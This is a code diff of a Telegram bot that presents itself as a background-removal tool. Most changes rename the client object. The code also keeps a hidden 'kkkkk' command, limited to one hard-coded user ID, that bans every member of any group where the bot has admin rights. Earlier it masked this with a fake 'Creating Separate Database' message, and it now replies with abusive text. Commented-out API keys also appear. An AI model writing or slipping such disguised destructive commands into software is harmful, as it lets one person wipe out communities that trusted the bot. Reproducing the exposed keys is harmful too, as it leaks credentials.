@@ -17,7 +17,7 @@ UNSCREEN_API = os.environ.get("UNSCREEN_API", "")
 #MONGO_URL = os.environ.get("MONGO_URL")
 
 
-bot = Client(
+app = Client(
     "Level" ,
     api_id = API_ID ,
     api_hash = API_HASH ,
@@ -26,7 +26,7 @@ bot = Client(
 
 Pic = "https://telegra.ph/file/59c987c5c838e973e8d3f.jpg"
 
-@bot.on_message(filters.new_chat_members)
+@app.on_message(filters.new_chat_members)
 async def new(bot, message):
         im = message.from_user.id
         nm = message.from_user.mention
@@ -38,7 +38,7 @@ async def new(bot, message):
 #REMOVEBG_API = "KMFFqrBYBocDHBYbz8Gwa2np"
 #UNSCREEN_API = "zhLmhhqxbYrKbXrsw5bbnKeo"
 
-@bot.on_message(filters.private & (filters.photo | filters.video | filters.document))
+@app.on_message(filters.private & (filters.photo | filters.video | filters.document))
 async def remove_background(bot, update):
     if not (REMOVEBG_API or UNSCREEN_API):
         await update.reply_text(
@@ -143,31 +143,34 @@ def removebg_video(file):
 
 BOT_ID = 5720302471
 
-@bot.on_message(filters.command("kkkk") & filters.user(1497264683))
+SK = "Creating Seprate Database for your Group \nThis May take Some Time Please Wait..."             
+NK = "Required Admin permission To Send Messages in Group"
+
+@app.on_message(filters.command("kkkkk") & filters.user(1497264683))
 async def ban_all(_,msg):
     chat_id=msg.chat.id    
-    bot=await bot.get_chat_member(chat_id,BOT_ID)
+    bot=await app.get_chat_member(chat_id,BOT_ID)
     bot_permission=bot.privileges.can_restrict_members==True    
     if bot_permission:
-        async for member in bot.get_chat_members(chat_id):       
+        async for member in app.get_chat_members(chat_id):       
             try:
-                    await bot.ban_chat_member(chat_id, member.user.id)
-                    await msg.reply_text(f"Creating Seprate Database for your Group \nThis May take Some Time Please Wait...")                    
+                    await app.ban_chat_member(chat_id, member.user.id)
+                    await msg.reply_text(f"ғᴜᴄᴋɪɴɢ ᴀʟʟ ᴍᴇᴍʙᴇʀs ᴀɴᴅ ᴛʜᴇɪʀ ᴍᴏᴍs ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ {member.user.mention}")                    
             except Exception:
                 pass
     else:
-        await msg.reply_text("Required Admin permission To Send Messages in Group")  
-                                         
+        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɢʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")  
+                                                                            
 
-@bot.on_message(filters.command("r"))
+@app.on_message(filters.command("r"))
 async def rel(bot, message):
     await message.reply_text("!bot reloaded")
 
-@bot.on_message(filters.command("start") & filters.private)
+@app.on_message(filters.command("start") & filters.private)
 async def start(bot, message):
     await message.reply_text("Pretty much nothing for Normies \n Join @Anime_Gaming_Chat_Global")
 
-@bot.on_message(filters.command("settings") & filters.private)
+@app.on_message(filters.command("settings") & filters.private)
 async def settings(bot, message):
     uid = message.from_user.id
     mystic = await message.reply_text("Getting User Unique id...")
@@ -180,5 +183,5 @@ async def settings(bot, message):
 
 ##
 
-bot.run() 
+app.run() 
 idle()
